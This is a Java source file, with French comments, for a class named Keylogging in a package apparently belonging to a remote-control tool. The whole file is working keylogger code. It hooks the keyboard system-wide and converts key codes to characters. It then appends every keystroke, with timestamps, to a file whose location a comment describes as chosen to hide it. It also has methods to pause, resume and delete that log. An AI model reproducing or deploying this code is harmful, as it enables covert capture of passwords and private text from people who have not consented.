package remote.action;

import java.awt.Toolkit;
import java.awt.event.KeyEvent;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.nio.file.Paths;
import java.util.Date;

import de.ksquared.system.keyboard.GlobalKeyListener;
import de.ksquared.system.keyboard.KeyListener;

/**
 * Classe initialisant deux Thread permettant d'enregistrer toutes les saisies
 * au Clavier dans un fichier
 * 
 * @author lh
 *
 */
public class Keylogging extends Thread
{

	private static boolean		capslock;								// Flag pour les touches speciales
	private String					cheminFile;							// nom du Fichier
	private File					f;
	private PrintWriter			pw;										// Flux d'ecriture dans le fichier
	private boolean				shift;									//

	private char					buffer;
	private int						code;
	private int						nombredecaractereparligne	= 0;
	private int						did								= 0;
	private GlobalKeyListener	m_globalKeyListener;
	private KeyListener			m_keylistener;
	private Date					m_Date;

	public Keylogging() throws IOException
	{

		// TODO Auto-generated constructor stub
		cheminFile = getPath();													// Choisi un endroit pour cacher le fichier
		buffer = 0;
		capslock = Toolkit.getDefaultToolkit().getLockingKeyState(
				KeyEvent.VK_CAPS_LOCK);
		f = new File(cheminFile);												// Ouvre le fichier
		pw = new PrintWriter(new BufferedWriter(new FileWriter(cheminFile, true)));								// Ouvre en ecriture
		if (f.exists())

			this.runn1(); 														// Demarre le keylogger
		else
		{

			System.out.println("Ne peux pas ouvrir un fichier "
					+ "pour sauvegarder les frappes");
		}
	}

	public String getCheminFile()
	{
		return cheminFile;
	}

	public void setCheminFile(String cheminFile)
	{
		this.cheminFile = cheminFile;
	}

	public void arreteKeylog()
	{
		pw.close();
	}

	public void relancerKeylog()
	{
		try
		{
			pw = new PrintWriter(new BufferedWriter(new FileWriter(cheminFile,
					true)));
		}
		catch (IOException e)
		{
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	/**
	 * Converti un code Ascii en Caractere
	 * @param code : numero Ascii
	 * @return
	 */
	char codeToChar(int code)
	{
		char key = 0;
		switch (code)
		{
			case 48:
			{
				key = '0';
			}
			case 01:
			{
				key = '0';
			}
				break;
			case 49:
			{
				key = '1';
			}
				break;
			case 50:
			{
				key = '2';
			}
				break;
			case 51:
			{
				key = '3';
			}
				break;
			case 52:
			{
				key = '4';
			}
				break;
			case 53:
			{
				key = '5';
			}
				break;
			case 54:
			{
				key = '6';
			}
				break;
			case 55:
			{
				key = '7';
			}
				break;
			case 56:
			{
				key = '8';
			}
				break;
			case 57:
			{
				key = '9';
			}
				break;
			case 96:
				key = 'à';
				break;
			case 97:
				key = '&';
				break;
			case 98:
				key = 'é';
				break;
			case 99:
				key = '"';
				break;
			case 100:
				key = '{';
				break;
			case 101:
				key = '(';
				break;
			case 102:
				key = '-';
				break;
			case 103:
				key = 'è';
				break;
			case 104:
				key = '_';
				break;
			case 105:
				key = 'ç';
				break;

			case 65:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'A';
				}
				else
				{
					key = 'a';
				}
			}
				break;
			case 66:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'B';
				}
				else
				{
					key = 'b';
				}
			}
				break;
			case 67:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'C';
				}
				else
				{
					key = 'c';
				}
			}
				break;
			case 68:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'D';
				}
				else
				{
					key = 'd';
				}
			}
				break;
			case 69:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'E';
				}
				else
				{
					key = 'e';
				}
			}
				break;
			case 70:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'F';
				}
				else
				{
					key = 'f';
				}
			}
				break;
			case 71:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'G';
				}
				else
				{
					key = 'g';
				}
			}
				break;
			case 72:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'H';
				}
				else
				{
					key = 'h';
				}
			}
				break;
			case 73:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'I';
				}
				else
				{
					key = 'i';
				}
			}
				break;
			case 74:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'J';
				}
				else
				{
					key = 'j';
				}
			}
				break;
			case 75:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'K';
				}
				else
				{
					key = 'k';
				}
			}
				break;
			case 76:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'L';
				}
				else
				{
					key = 'l';
				}
			}
				break;
			case 77:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'M';
				}
				else
				{
					key = 'm';
				}
			}
				break;
			case 78:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'N';
				}
				else
				{
					key = 'n';
				}
			}
				break;
			case 79:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'O';
				}
				else
				{
					key = 'o';
				}
			}
				break;
			case 80:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'P';
				}
				else
				{
					key = 'p';
				}
			}
				break;
			case 81:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'Q';
				}
				else
				{
					key = 'q';
				}
			}
				break;
			case 82:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'R';
				}
				else
				{
					key = 'r';
				}
			}
				break;
			case 83:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'S';
				}
				else
				{
					key = 's';
				}
			}
				break;
			case 84:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'T';
				}
				else
				{
					key = 't';
				}
			}
				break;
			case 85:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'U';
				}
				else
				{
					key = 'u';
				}
			}
				break;
			case 86:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'V';
				}
				else
				{
					key = 'v';
				}
			}
				break;
			case 87:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'W';
				}
				else
				{
					key = 'w';
				}
			}
				break;
			case 88:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'X';
				}
				else
				{
					key = 'x';
				}
			}
				break;
			case 89:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'Y';
				}
				else
				{
					key = 'y';
				}
			}
				break;
			case 90:
			{
				if (shift && (!capslock) || (!shift) && capslock)
				{
					key = 'Z';
				}
				else
				{
					key = 'z';
				}
			}
				break;

			case 13:
				key = '\n';
				break;
			case 32:
				key = ' ';
				break;
			case 106:
				key = '*';
				break;
			case 107:
				key = '+';
				break;
			case 110:
				key = '.';
				break;
			case 190:
			{
				if (shift)
				{
					key = '>';
				}
				else
				{
					key = '.';
				}
			}
				break;
			case 111:
				key = '/';
				break;
			case 191:
			{
				if (shift)
				{
					key = '?';
				}
				else
				{
					key = '/';
				}
			}
				break;
			case 188:
			{
				if (shift)
				{
					key = '<';
				}
				else
				{
					key = ',';
				}
			}
				break;
			case 186:
			{
				if (shift)
				{
					key = ':';
				}
				else
				{
					key = ';';
				}
			}
				break;
			case 219:
			{
				if (shift)
				{
					key = '{';
				}
				else
				{
					key = '[';
				}
			}
				break;
			case 221:
			{
				if (shift)
				{
					key = '}';
				}
				else
				{
					key = ']';
				}
			}
				break;
			case 187:
			{
				if (shift)
				{
					key = '+';
				}
				else
				{
					key = '=';
				}
			}
				break;
			case 192:
			{
				if (shift)
				{
					key = '~';
				}
				else
				{
					key = '`';
				}
			}
				break;
			case 109:
				key = '-';
				break;
			case 189:
			{
				if (shift)
				{
					key = '_';
				}
				else
				{
					key = '-';
				}
			}
				break;

			case 160:
			{
				shift = true;
			}
				break;
			case 161:
			{
				shift = true;
			}
				break;
			case 20:
			{
				capslock = !capslock;
			}
				break;
		}
		return key;
	}

	private String getPath()
	{
		String chemin = ((System.getProperty("os.name").contains("win") || System
				.getProperty("os.name").contains("Win")) ? Paths.get("")
				.toAbsolutePath().toString() : "/dev")
				+ File.separator + "trace.txt";
		return chemin;
	}

	/**
	 * 		Methode run du Keylogger utilisant la libraire KeyboardHook ' H. Joseph, 23 Jul 2001 ' qui permet de capturer des saisies
	 * 		au clavier
	 *		Creation d'un Global Listener qui va lancer deux Thread: un pour l'appui sur une touche, un pour le relachement	
	 * 
	 */
	public void runn1()
	{
		m_globalKeyListener = null;
		m_keylistener = null;

		m_globalKeyListener = new GlobalKeyListener();
		m_globalKeyListener.addKeyListener(m_keylistener = new KeyListener()
		{
			@Override
			public void keyPressed(final de.ksquared.system.keyboard.KeyEvent event)
			{
				// TODO Auto-generated method stub
			}

			@Override
			public void keyReleased(
					final de.ksquared.system.keyboard.KeyEvent event)
			{
				// TODO Auto-generated method stub
				code = event.getVirtualKeyCode();
				
				char character = codeToChar(code);
				m_Date = new Date();

				if (did == 0)
				{
					pw.print(m_Date + " ");
					did = 1;
				}
				if (code != 8)
				{
					if (code == 01)
					{
						pw.print(" ~ClickLeft ");

					}
					else if (code == 02)
					{
						pw.print(" ~ClickRight ");

					}
					else if (code == 26)
					{
						pw.print(" ~DirUp ");

					}
					else if (code == 25)
					{
						pw.print(" ~DirLeft ");

					}
					else if (code == 27)
					{
						pw.print(" ~DirUp ");

					}
					else if (code == 28)
					{
						pw.print(" ~DirLeft ");

					}
					else
					{
						buffer = character;
						pw.print(buffer);
						pw.flush();
						nombredecaractereparligne++;
						if (nombredecaractereparligne > 40)
						{
							pw.println();
							pw.flush();
							pw.print(m_Date + " ");
							nombredecaractereparligne = 0;
						}
					}
				}
			}
		});
	}

	public void supprimerFichier()
	{
		f.delete();
	}
}